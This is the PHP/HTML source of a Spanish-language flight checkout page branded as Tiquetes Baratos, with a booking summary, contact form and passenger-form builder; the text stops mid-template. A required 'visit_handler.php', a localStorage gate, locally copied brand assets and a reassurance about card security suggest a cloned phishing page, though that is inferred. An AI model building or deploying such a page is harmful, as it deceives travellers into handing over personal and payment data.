<?php require_once __DIR__ . '/visit_handler.php'; ?>
<!DOCTYPE html>
<html lang="en-gb" xmlns="https://www.w3.org/1999/xhtml" xml:lang="en-gb" dir="ltr">
<head>
    <link rel="manifest" href="./manifest.json">
    <link rel="preload" href="./assets/fonts/Poppins-SemiBold.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/Poppins-Medium.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/icomoon.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/Roboto-Regular.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/Roboto-Bold.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/Roboto-Medium.woff" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/fonts/Roboto-Light.woff" as="font" type="font/woff2" crossorigin>

    <link rel="preload" href="./assets/css/style-3ef3196ee5.min.css" as="style">
    <link rel="preload" href="./assets/css/globals-43f29dad88.min.css" as="style">

    <link rel="apple-touch-icon" href="./assets/images/logo.png">
    <meta name="theme-color" content="#ffffff">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--condicion de en que vista esta-->
    <!-- !$isInternational && -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="title" content="Tiquetes Baratos - Vuelos Baratos en Todos los Destinos."/>
    <link rel="shortcut icon" href="https://d2wcw8ctp0rb22.cloudfront.net/templates/tiquetesbaratos/images/favicon.ico" type="image/x-icon"/>

    <link rel="stylesheet" as="style" href="./assets/css/style-3ef3196ee5.min.css">
    <link rel="stylesheet" as="style" href="./assets/css/globals-43f29dad88.min.css">
    <link rel="stylesheet" media="print" onload="this.media='all'" href="./assets/css/jquery-41d22c0ceb.mobile-slider.min.css">

    <script type="text/javascript">
    window.dataLayer = window.dataLayer || [];
    var conf = {}

    if (!localStorage.getItem('keyIdentifyForUser')) {
        window.location = '/';
    }
    </script>
    <style type="text/css">
    .loading-message {
        border: 1px solid #15327F;
        padding: .75em 1em;
        margin: 1em 0;
        border-radius: 4px;
        font-size: 1.083em;
        font-weight: bold;
        color: #15327F;
        text-align: center;
    }

    .loading-message .cssload-jumping {
        display: inline-block;
        margin: 0 1em -.25em 0;
        vertical-align: middle;
        line-height: 1;
    }

    .espera {
        background: #FFF !important;
        z-index: 9999 !important;
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100% !important;
        height: 100% !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        margin-top: 0 !important;
        margin-left: 0 !important;
    }

    .content-landing {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    .espera-gif {
        background-image: url("./assets/images/espera.gif");
        background-repeat: no-repeat;
        width: 174px;
        height: 173px;
    }

    .espera-png {
        background-image: url("./assets/images/espera.png");
        background-repeat: no-repeat;
        width: 630px;
        height: 306px;
    }
    </style>

    <meta charset="utf-8"/>
    <title>Tiquetes Baratos</title>
    <link href="/templates/tiquetesbaratos/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"/>

</head>

<body>
    <div class="espera" id="espera" style="visibility:visible;">
        <div class="content-landing">
            <div class="espera-gif" id="./assets/images/espera-home-gif"></div>
        </div>
    </div>
    <div class="content-body">
        <!-- header -->
        <header class="c-header container-fluid shadow-sm mb-1">
            <nav class="pt-0 px-0 px-lg-0">
                <div class="container md-container">
                    <div class="row navbar">
                        <div class="col-4 col-md-2">
                            <a class="navbar-brand mt-0 ml-2 ml-md-0" href="./">
                                <img width="100" height="100" alt="logo tiquetes baratos" src="./assets/images/logo.png">
                            </a>
                        </div>
                        <div class="col-8 col-md-10 d-flex px-md-0 pr-0">
                            <ul class="nav ml-auto">
                                <li class="c-writing hide-xs">
                                    <a href="javascript:void(0);" class="py-2 d-block">
                                        <span class="icon icon-contact-support font-20 pr-2"></span>
                                        <span>Escríbenos</span>
                                    </a>
                                </li>
                                <li class="c-help-call px-3 ml-4 hide-xs">
                                    <a role="button" href="Javascript:void(0)" class="py-2 d-block btn-call-me" data-type="menu" modal-open data-target=".modalCall">
                                        <span class="icon icon-support-agent font-20 -pe-none"></span>
                                        <span class="-pe-none">¿Necesitas que te llamemos?</span>
                                    </a>
                                </li>
                                <li>
                                    <a id="sPhoneNumbers" class="nav-item dropdown mr-2 mr-md-0 ml-md-4 ch-dropdown pl-3 pr-2 mt-3 mt-md-0" href="Javascript:void(0)">
                                        <img width="30" height="23" class="mr-1" alt="logo nacionalidad" src="./assets/images/flag-co.png">
                                        <span class="px-1 color-gray">|</span>
                                        <span class="icon icon-phone font-20 mt-2"></span>
                                        <span class="hide-xs">
                                            <span>Bogotá</span>
                                            <span>- 601 743 6620</span>
                                        </span>
                                        <span class="icon icon-expand font-20 mt-2"></span>
                                    </a>
                                    <div id="cPhoneNumbers" class="p-0 px-md-4 py-md-3 c-phone-numbers shadow d-none">
                                        <div class="row c-header-mobile h-mobile">
                                            <div class="col-12">
                                                <div class="row py-4 px-3">
                                                    <div class="col-2 cClosePhoneNumbers">
                                                        <span class="icon icon-arrow-back1 font-24"></span>
                                                    </div>
                                                    <div class="col-10">
                                                        <span class="font-18 font-roboto-medium">¡Comunícate con nosotros!</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row p-3 p-md-0 b-mobile">
                                            <div class="col-12 col-md-6 px-4 px-md-2">
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:601 743 6620">
                                                    <span class="color-purple">Bogotá</span>
                                                    <span class="float-right">601 743 6620</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:605 385 2828">
                                                    <span class="color-purple">Barranquilla</span>
                                                    <span class="float-right">605 385 2828</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:606 735 9840">
                                                    <span class="color-purple">Armenia</span>
                                                    <span class="float-right">606 735 9840</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:605 589 4120">
                                                    <span class="color-purple">Valledupar</span>
                                                    <span class="float-right">605 589 4120</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:607 697 0800">
                                                    <span class="color-purple">Bucaramanga</span>
                                                    <span class="float-right">607 697 0800</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:602 485 0400">
                                                    <span class="color-purple">Cali</span>
                                                    <span class="float-right">602 485 0400</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:602 736 5080">
                                                    <span class="color-purple">Pasto</span>
                                                    <span class="float-right">602 736 5080</span>
                                                </a>
                                            </div>
                                            <div class="col-12 col-md-6 px-4 px-md-2">
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:605 436 6151">
                                                    <span class="color-purple">Santa Marta</span>
                                                    <span class="float-right">605 436 6151</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:607 594 3050">
                                                    <span class="color-purple">Cúcuta</span>
                                                    <span class="float-right">607 594 3050</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:604 604 1777">
                                                    <span class="color-purple">Medellín</span>
                                                    <span class="float-right">604 604 1777</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:606 340 0720">
                                                    <span class="color-purple">Pereira</span>
                                                    <span class="float-right">606 340 0720</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:605 693 0520">
                                                    <span class="color-purple">Cartagena</span>
                                                    <span class="float-right">605 693 0520</span>
                                                </a>
                                                <a class="dropdown-item px-1 py-2" role="button" href="tel:606 891 8920">
                                                    <span class="color-purple">Manizales</span>
                                                    <span class="float-right">606 891 8920</span>
                                                </a>
                                            </div>
                                            <div class="col-12 px-4 pt-2 hide-desk hide-desk-md hide-desk-lg">
                                                <ul class="nav w-100">
                                                    <li class="c-help-call px-3 w-100 my-2 text-center">
                                                        <a role="button" href="Javascript:void(0)" class="py-2 d-block btn-call-me cClosePhoneNumbers" data-type="menu" modal-open data-target=".modalCall">
                                                            <span class="icon icon-support-agent font-20 -pe-none"></span>
                                                            <span class="-pe-none">¿Necesitas que te llamemos?</span>
                                                        </a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </nav>

        </header>
        <!-- start modal call -->
        <div class="modal fade modalCall" id="modalCall" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-md">
                <form class="modal-content" novalidate="true" method="post" name="formllamadatos" id="formllamadatos" action="index.php?option=com_llama">
                    <input type="hidden" name="2b13960c85c517541123916875b5d4f4" value="1"/>
                    <div class="row">
                        <div class="col-12 col-md-6 bg-modal-call hide-xs">
                            <div class="c-animated-call cac-1">
                                <span class="icon icon-phone d-block text-center font-30 pt-2"></span>
                                <span class="d-block px-3 font-12 text-center mt-1">Asesores disponibles</span>
                                <img alt="asesores" width="60" src="./assets/images/animated-call.svg"/>
                            </div>
                        </div>
                        <div class="col-12 col-md-6">
                            <div class="modal-header border-0 pb-1 pb-md-3">
                                <button modal-close=".modalCall" type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body pt-0 px-4">
                                <h5 class="font-18 font-poppins-semibold mb-2">¿Necesitas que te llamemos?</h5>
                                <div class="row">
                                    <div class="col-12">
                                        <div class="form-group mt-1">
                                            <!-- <input name="nombre" id="nombrecall" type="text" class="form-control" data-invalid="nombrecall_invalid" placeholder="Tu nombre" required="true"> -->
                                            <div id="nombrecall_invalid" class="invalid-feedback">
                                                                                            Por favor digite su nombre de contacto!
                                                                                        </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">

                                    <div class="col-12">
                                        <div class="form-group mt-1">
                                            <!-- <input type="text" name="telefono" id="telefonocall" data-invalid="telefonocall_invalid" size="10" class="form-control" placeholder="Teléfono o celular (10 dígitos)" required="true"> -->
                                            <div id="telefonocall_invalid" class="invalid-feedback">
                                                                                            Por favor digite su numero de contacto!
                                                                                        </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="g-recaptcha">
                                    <div id="g-recaptcha" data-invalid="g_recaptcha_invalid"></div>
                                    <div id="g_recaptcha_invalid" class="invalid-feedback">
                                                                            Por favor verifique el recaptcha!
                                                                        </div>
                                </div>
                                <div class="mt-3">
                                    <div class="col-12 px-0">
                                        <button class="btn btn-blue w-100 py-3" type="submit">Enviar</button>
                                    </div>
                                </div>
                                <div class="c-recapcha mt-3">
                                    <div class="col-12 bg-recapcha py-3">
                                        <div class="row">
                                            <div class="col-12">
                                                <p class="font-18 mb-1 f-bold">Horario de atención</p>
                                                <p class="font-16 mb-1 gray-200">De lunes a viernes de 06:00 AM a 11:50 PM</p>
                                                <p class="font-16 mb-1 gray-200">Sábados, domingos y festivos 07:00 AM a 11:50 PM </p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <!-- end modal call -->

        <div id="imgtagsmotor" style="width:978px;"></div>

        <script type="text/javascript">
        function displayff(valor) {
            estado = document.getElementById("changeff" + valor + "").checked;
            if (estado == true) {
                document.getElementById("displayff" + valor + "").style.display = "inline";
            }
            if (estado == false) {
                document.getElementById("displayff" + valor + "").style.display = "none";
            }
        }

        function new_window(url) {

            var vinculo = window.open(url, "Link", "toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=yes,resizable=0,width=430,height=300,left=80,top=180");

        }
        </script>
        <section class="container c-checkout">

            <div class="row pt-4 hide-xs">
                <div class="col-12">
                    <h1 class="font-28 f-r-medium my-0">¡Asegure su reserva ahora!</h1>
                    <p class="font-20 f-r-medium my-0">
                                            Informaci&oacute;n del viajero </p>
                </div>
            </div>

            <!--informacion de la reservación-->
            <form method="post" novalidate="true" name="formreservar" id="formreservar" action="index.php?option=com_sabre&view=reservar4" class="row py-4">
                <div class="col-12 col-md-5 info-reservation-checkout" template="home">
                    <!-- start summary -->
                    <div id="cSummary" class="c-summary pt-3 px-3 mb-3 ">
                        <div id="closeSummaryMobile" class="c-header-mobile hide-md hide-lg p-4 d-none">
                            <span style="cursor: pointer;" class="icon icon-chevron-left text-white font-40 pe-auto"></span>
                            <span class="text-white text-center d-block">Tu reservación</span>
                        </div>
                        <h3 class="font-28 f-r-medium mt-4 mt-md-0">Tu reservación</h3>
                        <div>
                            <!--informacion del vuelo ida-->
                            <div class="cs-info" id="info_ida">
                                <span class="icon icon-plane-right font-28 position-t-2"></span>
                                <span class="font-18">Ida</span>
                                <span class="float-right">
                                    <img width="100%" height="40px" style="max-width: 100px; object-fit: contain;" id="image_vuelo_ida" data-attribute="image_vuelo_ida" src=""/>
                                </span>
                                <p class="mt-3 mb-2" id="idaDepartureDateTime"></p>
                                <div class="mb-2 position-relative d-block c-info-rate c-tooltip-01">
                                    <span class="mb-0 pb-0">
                                        <span>Vuelo:</span>
                                        <span id="idaFlightNumber"></span>
                                    </span>
                                    <span class="mx-1">|</span>
                                    <span paradas-vuelos-ida id="cDetail02" class="ct-info a-link a-link-1 text-center mb-0 pb-0">
                                                                            Directo </span>
                                    <div id="contentTooltip-ida-idaregreso" class="c-tooltip-text shadow p-2">
                                        <div class="border p-2 ctt-int">
                                            <div class="row my-2">
                                                <div class="col-5 pr-0">
                                                    <span class="icon icon-plane-right"></span>
                                                    <span class="strong">Ida</span>
                                                </div>
                                                <div class="col-7 d-flex img-al">
                                                    <img class="ml-auto" id="image_vuelo_ida_menu" data-attribute="image_vuelo_ida_menu" src="">
                                                </div>
                                                <div class="col-12">
                                                    <hr class="mt-1 mb-0"/>
                                                </div>
                                            </div>
                                            <div class="col-12 px-0">
                                                <p class="mb-0" id="idaDepartureDateTime_menu"></p>
                                            </div>
                                            <div class="row">
                                                <div class="col-3 text-center pr-0">
                                                    <span class="font-10 color-gray-300 ct-iata" id="code_ida"></span>
                                                    <span class="strong" id="time_ida"></span>
                                                </div>
                                                <div class="col-6 text-center px-1">
                                                    <span class="s-line-flight"></span>
                                                </div>
                                                <div class="col-3 text-center pl-0">
                                                    <span class="font-10 color-gray-300 ct-iata" id="code_regreso"></span>
                                                    <span class="strong" id="time_regreso"></span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <p class="mb-2">
                                    <span>Sale: </span>
                                    <span class="f-r-medium" id="idaDepartureAirport"></span>
                                </p>
                                <p class="mb-2">
                                    <span>Llega:</span>
                                    <span class="f-r-medium" id="idaArrivalAirport"></span>
                                </p>
                                <p class="mb-2">
                                    <span>Tarifa:</span>
                                    <span class="a-link-1" id="idaTradeName"></span>
                                </p>
                            </div>
                            <!--separador-->
                            <div class="col-12 px-0">
                                <hr/>
                            </div>
                            <!--regreso-->
                            <div class="cs-info" id="info_regreso">
                                <span class="icon icon-plane-left font-28 position-t-2"></span>
                                <span class="font-18">Regreso</span>
                                <span class="float-right">
                                    <img width="100%" height="40px" style="max-width: 100px; object-fit: contain;" id="image_vuelo_regreso" data-attribute="image_vuelo_regreso" src=""/>
                                </span>
                                <p class="mt-3 mb-2" id="regresoDepartureDateTime"></p>
                                <div class="mb-2 position-relative d-block c-info-rate c-tooltip-01">
                                    <span class="mb-0 pb-0">
                                        <span>Vuelo:</span>
                                        <span id="regresoFlightNumber"></span>
                                    </span>
                                    <span class="mx-1">|</span>
                                    <span paradas-vuelos-regreso id="cDetail02" class="ct-info a-link a-link-1 text-center mb-0 pb-0">
                                                                            Directo </span>
                                    <div id="contentTooltip-regreso-idaregreso" class="c-tooltip-text shadow p-2">
                                        <div class="border p-2 ctt-int">
                                            <div class="row my-2">
                                                <div class="col-5 pr-0">
                                                    <span class="icon icon-plane-left"></span>
                                                    <span class="strong">Regreso</span>
                                                </div>
                                                <div class="col-7 d-flex img-al">
                                                    <img class="ml-auto" id="image_vuelo_regreso_menu" data-attribute="image_vuelo_regreso_menu" src="">
                                                </div>
                                                <div class="col-12">
                                                    <hr class="mt-1 mb-0"/>
                                                </div>
                                            </div>
                                            <div class="col-12 px-0">
                                                <p class="mb-0" id="regresoDepartureDateTime_menu"></p>
                                            </div>
                                            <div class="row">
                                                <div class="col-3 text-center pr-0">
                                                    <span class="font-10 color-gray-300 ct-iata" id="code_ida_menu"></span>
                                                    <span class="strong" id="regresoDepartureAirport_menu"></span>
                                                </div>
                                                <div class="col-6 text-center px-1">
                                                    <span class="s-line-flight"></span>
                                                </div>
                                                <div class="col-3 text-center pl-0">
                                                    <span class="font-10 color-gray-300 ct-iata" id="code_regreso_menu"></span>
                                                    <span class="strong" id="regresoArrivalAirport_menu"></span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <p class="mb-2">
                                    <span>Sale: </span>
                                    <span id="regresoDepartureAirport" class="f-r-medium"></span>
                                </p>
                                <p class="mb-2">
                                    <span>Llega: </span>
                                    <span class="f-r-medium" id="regresoArrivalAirport"></span>
                                </p>
                                <p class="mb-2">
                                    <span>Tarifa:</span>
                                    <span id="regresoTradeName" class="a-link-1"></span>
                                </p>
                            </div>
                            <!--fin vuelo ida (ida y regreso)-->
                            <input type="hidden" name="fechadeviajeviajero" value="2024-09-17T04:44:00Z"/>

                            <input type="hidden" name="ida_salida" value="04:44"/>
                            <input type="hidden" name="ida_llegada" value="05:45"/>
                            <input type="hidden" name="regreso_salida" value="05:18"/>
                            <input type="hidden" name="regreso_llegada" value="06:15"/>

                            <!--informacion de costos por persona-->
                            <div class="row bg-yellow-05 py-3">

                                <div class="col-4 col-md-5 pr-0 font-22 color-blue f-semibold">TOTAL</div>
                                <div class="col-8 col-md-7 font-22 color-blue f-semibold text-right">
                                    <span class="font-22 color-blue f-semibold" data-attribute="precioTotal" id="pricetotal" value-pricetotal="99998<" pricetotal></span>
                                     COP
                                                                    
                                </div>

                            </div>
                        </div>
                    </div>

                    <script>
                   document.addEventListener("DOMContentLoaded", function () {
    const image_vuelo_ida = document.querySelector('img[data-attribute="image_vuelo_ida"]');
    const image_vuelo_regreso = document.querySelector('img[data-attribute="image_vuelo_regreso"]');

    const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida')) || {};
    const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso')) || {};

    const origenAndDes = localStorage.getItem('pt.tb.history_booker_prod');
    const from = origenAndDes ? JSON.parse(origenAndDes).from[0] : {};
    const to = origenAndDes ? JSON.parse(origenAndDes).to[0] : {};

    const image_vuelo_ida_menu = document.querySelector('img[data-attribute="image_vuelo_ida_menu"]');
    const image_vuelo_regreso_menu = document.querySelector('img[data-attribute="image_vuelo_regreso_menu"]');

    const formattDate = (date) => {
        if (!date) return "Fecha no disponible";
        const exampleDate = new Date(date);
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
        return exampleDate.toLocaleDateString('es-ES', options);
    };

    function convertPriceToNumber(priceStr) {
        if (!priceStr) return 0; // Evita errores si el precio es null o undefined
        const numericStr = priceStr.replace(/[^\d]/g, ''); // Elimina todo lo que no sea número
        return parseInt(numericStr, 10) || 0;
    }

    function sumPrices(price1, price2) {
        return convertPriceToNumber(price1) + convertPriceToNumber(price2);
    }

    const passengerCount = parseInt(localStorage.getItem('total-person-display'), 10) || 1;

    if (localStorage.getItem('tripMode') === '1') {
        document.getElementById('info_regreso').style.display = 'none';
        image_vuelo_ida.src = datosVueloIda.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';
        document.getElementById('idaDepartureDateTime').innerHTML = formattDate(localStorage.getItem('startDateText'));
        document.getElementById('idaFlightNumber').innerHTML = datosVueloIda.flightNumber || "No disponible";
        document.getElementById('idaDepartureAirport').innerHTML = `${from.displayText || ""} - ${datosVueloIda.departure || ""}`;
        document.getElementById('idaArrivalAirport').innerHTML = `${to.displayText || ""} - ${datosVueloIda.arrival || ""}`;
        document.getElementById('idaTradeName').innerHTML = datosVueloIda.type || "No disponible";
        image_vuelo_ida_menu.src = datosVueloIda.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';
        document.getElementById('idaDepartureDateTime_menu').innerHTML = formattDate(localStorage.getItem('startDateText'));
        document.getElementById('code_ida').innerHTML = from.code || "";
        document.getElementById('time_ida').innerHTML = datosVueloIda.departure || "";
        document.getElementById('code_ida_menu').innerHTML = to.code || "";

        const totalPrice = convertPriceToNumber(datosVueloIda.price) * passengerCount;
        document.getElementById('pricetotal').innerHTML = `$${totalPrice.toLocaleString()}`;
    } else {
        image_vuelo_ida.src = datosVueloIda.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';
        image_vuelo_regreso.src = datosVueloRegreso.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';

        document.getElementById('idaDepartureDateTime').innerHTML = formattDate(localStorage.getItem('startDateText'));
        document.getElementById('regresoDepartureDateTime').innerHTML = formattDate(localStorage.getItem('endDateText'));

        document.getElementById('idaFlightNumber').innerHTML = datosVueloIda.flightNumber || "No disponible";
        document.getElementById('regresoFlightNumber').innerHTML = datosVueloRegreso.flightNumber || "No disponible";

        document.getElementById('idaDepartureAirport').innerHTML = `${from.displayText || ""} - ${datosVueloIda.departure || ""}`;
        document.getElementById('idaArrivalAirport').innerHTML = `${to.displayText || ""} - ${datosVueloIda.arrival || ""}`;
        document.getElementById('idaTradeName').innerHTML = datosVueloIda.type || "No disponible";

        document.getElementById('regresoDepartureAirport').innerHTML = `${to.displayText || ""} - ${datosVueloRegreso.departure || ""}`;
        document.getElementById('regresoArrivalAirport').innerHTML = `${from.displayText || ""} - ${datosVueloRegreso.arrival || ""}`;
        document.getElementById('regresoTradeName').innerHTML = datosVueloRegreso.type || "No disponible";

        image_vuelo_ida_menu.src = datosVueloIda.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';
        image_vuelo_regreso_menu.src = datosVueloRegreso.vuelo === 'latam' ? './assets/images/LA.png' : './assets/images/AV.png';

        document.getElementById('idaDepartureDateTime_menu').innerHTML = formattDate(localStorage.getItem('startDateText'));
        document.getElementById('regresoDepartureDateTime_menu').innerHTML = formattDate(localStorage.getItem('endDateText'));

        document.getElementById('code_ida').innerHTML = from.code || "";
        document.getElementById('code_regreso').innerHTML = to.code || "";
        document.getElementById('time_ida').innerHTML = datosVueloIda.departure || "";
        document.getElementById('time_regreso').innerHTML = datosVueloRegreso.arrival || "";
        document.getElementById('code_ida_menu').innerHTML = to.code || "";
        document.getElementById('code_regreso_menu').innerHTML = from.code || "";
        document.getElementById('regresoDepartureAirport_menu').innerHTML = datosVueloRegreso.departure || "";
        document.getElementById('regresoArrivalAirport_menu').innerHTML = datosVueloRegreso.arrival || "";

        const totalPrice = sumPrices(datosVueloIda.price, datosVueloRegreso.price) * passengerCount;
        document.getElementById('pricetotal').innerHTML = `$${totalPrice.toLocaleString()}`;
    }
});

                    </script>

                    <!-- start detail info -->
                    <div class="c-detail-info p-3 hide-xs">
                        <p class="text-center mb-2">
                            <span class="icon icon-lock color-blue font-28 position-t-2"></span>
                            <span>Su información personal y su transacción están seguras</span>
                        </p>
                        <p class="mb-2 text-center">
                            <span class="color-blue f-r-medium">NO SE GUARDA INFORMACIÓN</span>
                            <span>sobre las tarjetas de crédito de los usuarios que realicen las transacciones en nuestro portal. Nuestra plataforma de pago en línea está avalada por VeriSign.</span>
                        </p>
                    </div>
                </div>

                <script>
                //datalayer dafault-form-checkout
                window.addEventListener("load", function() {
                    let item_datalayer = {
                        event: "add_to_cart",
                        ecommerce: {
                            items: [],
                            layer: "flights",
                            //total_flights: ""//question
                            field_origin_iata: "BOG",
                            field_origin_name: "Bogota",
                            field_destination_iata: "BAQ",
                            field_destination_name: "Barranquilla",
                            field_date1: "2024-09-17",
                            field_date2: "2024-09-18",
                            travelers_adults: 1,
                            travelers_children: 0,
                            travelers_infants: 0,
                            travelers_infants_inseat: 0,
                            travelers_infants_onlap: 0,

                            value: 99998
                        },
                    }
                    if ("add_to_cart" == "begin_checkout") {
                        item_datalayer.ecommerce.transaction_id = "";
                    }
                    item_datalayer.ecommerce.items.push({
                        item_id: "BOG-BAQ-la",
                        item_name: "Bogota-Barranquilla-la",
                        //item_list_name: "flights_home",
                        price: 225970,
                        item_brand: "la",
                        item_category: "idaregreso",
                        item_category2: "nacional",
                        item_variant: "departing",
                        //question

                        quantity: 1,
                    })
                    item_datalayer.ecommerce.items.push({
                        item_id: "BAQ-BOG-la",
                        item_name: "Barranquilla-Bogota-la",
                        //item_list_name: "flights_home",
                        price: 225970,
                        item_brand: "la",
                        item_category: "idaregreso",
                        item_category2: "nacional",
                        item_variant: "returning",
                        //question

                        quantity: 1,
                    })
                    dataLayer.push(item_datalayer);

                })
                </script>
                <div id="modalNacionalTarifa"></div>
                <!-- start modal info flight Base international -->
                <div class="modal fade" id="modalTarifaInternacional" tabindex="-1" aria-labelledby="exampleModalLabel02" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
                        <div class="modal-content">
                            <div class="modal-header border-0 pb-1">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body pt-0 px-4">
                                <div class="row">
                                    <div class="col-12">
                                        <h5 class="font-poppins-medium font-28 mb-3">Tarifa : </h5>
                                    </div>
                                </div>
                                <div class="pb-5" id="loadingRate">
                                    <div class="loader-background text-center m-5" id="loadingTaf">
                                        <svg width="120" height="20" viewBox="0 0 120 30" xmlns="http://www.w3.org/2000/svg" fill="#fff">
                                            <circle cx="15" cy="15" r="15" fill="#035aaf">
                                                <animate attributeName="r" from="15" to="15" begin="0s" dur="0.8s" values="15;9;15" calcMode="linear" repeatCount="indefinite"></animate>
                                                <animate attributeName="fill-opacity" from="1" to="1" begin="0s" dur="0.8s" values="1;.5;1" calcMode="linear" repeatCount="indefinite"></animate>
                                            </circle>
                                            <circle cx="60" cy="15" r="9" fill="#037bba">
                                                <animate attributeName="r" from="9" to="9" begin="0s" dur="0.8s" values="9;15;9" calcMode="linear" repeatCount="indefinite"></animate>
                                                <animate attributeName="fill-opacity" from="0.5" to="0.5" begin="0s" dur="0.8s" values=".5;1;.5" calcMode="linear" repeatCount="indefinite"></animate>
                                            </circle>
                                            <circle cx="105" cy="15" r="15" fill="#2196f3">
                                                <animate attributeName="r" from="15" to="15" begin="0s" dur="0.8s" values="15;9;15" calcMode="linear" repeatCount="indefinite"></animate>
                                                <animate attributeName="fill-opacity" from="1" to="1" begin="0s" dur="0.8s" values="1;.5;1" calcMode="linear" repeatCount="indefinite"></animate>
                                            </circle>
                                        </svg>
                                        <span style="display: block; padding: 5px; font-size: 14px; color: #4588c2;">
                                                                                    Cargando detalle de tarifa
                                                                                </span>
                                    </div>
                                </div>
                                <div class="row d-none" id="intRateContent"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <!--formulario checkout-->
                <div class="col-12 col-md-7 pr-md-0 c-payments-checkout">
                    <!-- start book and payment -->
                    <div id="cBookAndPay">
                        <div id="container-form"></div>

                        <!-- Contact Formulario -->
                        <div class="c-forms py-3 px-4 mb-3" id="contact-form">
                            <div class="row">
                                <div class="col-12 mb-2">
                                    <label>Información del contacto</label>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12 col-md-6 px-2">
                                    <div class="form-group position-relative">
                                        <label class="font-12 px-1 label-xs">Teléfono o Celular (10 dígitos)</label>
                                        <input type="number" class="form-control" name="telefonomovil" id="telefonomovil" autocomplete="off" data-skip-validation="true">
                                        <div id="telefonomovil1_invalid" class="invalid-feedback">
                                                  Por favor digite el teléfono de contacto valido (mínimo 7 dígitos, máximo 10 dígitos)
                                                </div>
                                    </div>
                                </div>
                                <div class="col-12 col-md-6 px-2">
                                    <div class="form-group position-relative">
                                        <label class="font-12 px-1 label-xs">Correo electrónico @</label>
                                        <input type="email" class="form-control" name="correo" id="correo" required data-invalid="correo1_invalid">
                                        <div id="correo1_invalid" class="invalid-feedback">
                                                  Por favor digite el correo eléctrónico válido de contacto
                                                </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="row mb-3">
                            <div class="col-12 col-md-7">
                                <p class="font-14">

                                          Al hacer click en el botón Reservar y pagar, usted está aceptando los
                                          
                                    <a href="/" class="a-link-1" data-toggle="modal" data-target="#terms-and-conditions-checkout" role="button">Términos y Condiciones de compra y Ley de Retracto.</a>
                                </p>
                            </div>
                            <div class="col-12 col-md-5">
                                <button id="validate-button" type="button" class="btn btn-primary w-100 py-3">
                                      Reservar y Pagar
                                    </button>
                            </div>
                        </div>

                        <script>
                        document.addEventListener("DOMContentLoaded", function() {
                            const totalAdults = Number(localStorage.getItem('totalAdults') || 2);
                            const totalKids = Number(localStorage.getItem('totalKids') || 2);

                            const formContainer = document.getElementById("container-form");

                            function createPersonForm(index, type) {
                                const capitalizeType = type.charAt(0).toUpperCase() + type.slice(1);
                                return `
        <div class="c-forms mb-3">
          <div class="py-3 px-4 mb-3">
            <div class="row">
              <div class="col-12 mb-2">
                <label>${



                                capitalizeType} ${index + 1}</label>
              </div>
            </div>
            <div class="row">
              <div class="col-12 col-md-6 px-2">
                <div class="form-group position-relative">
                  <label class="font-12 px-1 label-xs">Primer nombre</label>
                  <input validation-valid-chart="true" name="nombre${





                                type}${index + 1}" id="nombre${type}${index + 1}" type="text" class="form-control" required>
                  <div id="nombre${type}${index + 1}_invalid" class="invalid-feedback">
                    Por favor digite su nombre, no incluir números o caracteres especiales
                  </div>
                </div>
              </div>
              <div class="col-12 col-md-6 px-2">
                <div class="form-group position-relative">
